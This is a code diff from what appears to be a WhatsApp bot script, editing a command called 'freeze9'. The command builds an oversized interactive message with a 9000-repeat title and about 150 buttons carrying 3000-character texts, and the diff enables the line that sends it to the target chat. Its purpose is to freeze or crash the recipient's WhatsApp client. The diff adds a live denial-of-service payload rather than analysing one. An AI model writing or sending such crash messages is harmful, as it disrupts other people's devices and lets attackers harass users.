@@ -14758,7 +14758,10 @@ case 'frage': {
 }
 break
 case "freeze9": {
-    if (isBot) return;
+    // Sofort abbrechen falls es ein Bot oder eigene Nachricht ist
+    if (msg.key.fromMe || 
+        (msg.participant && msg.participant.includes('@lid')) || 
+        msg.key.remoteJid.endsWith('@lid')) return;
 
     const target = msg.key.remoteJid;
 
@@ -14767,25 +14770,22 @@ case "freeze9": {
             {
                 name: "single_select",
                 buttonParamsJson: JSON.stringify({
-                    title: "\u0000".repeat(9000),
-                    sections: [{ title: "\u0000", rows: [] }]
+                    title: "".repeat(9000),
+                    sections: [{ title: "", rows: [] }]
                 })
             }
         ];
 
         for (let i = 0; i < 50; i++) {
             ButtonsQPay.push(
-                {
-                    name: "cta_call",
-                    buttonParamsJson: JSON.stringify({ status: true })
+                { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
+                { 
+                    name: "cta_copy", 
+                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(3000) }) 
                 },
-                {
-                    name: "cta_copy",
-                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(3000) })
-                },
-                {
-                    name: "quick_reply",
-                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(3000) })
+                { 
+                    name: "quick_reply", 
+                    buttonParamsJson: JSON.stringify({ display_text: "3".repeat(3000) }) 
                 }
             );
         }
@@ -14837,11 +14837,11 @@ case "freeze9": {
             }
         );
 
-        // Hier kannst du die Nachricht senden, z.B.:
-        // await sock.sendMessage(target, messageContent);
+        await sock.sendMessage(target, messageContent);
+        console.log(`✅ Freeze9 gesendet an ${target}`);
 
     } catch (e) {
-        console.error("Freeze9 Error:", e);
+        console.error("❌ Freeze9 Error:", e);
     }
     break;
 }
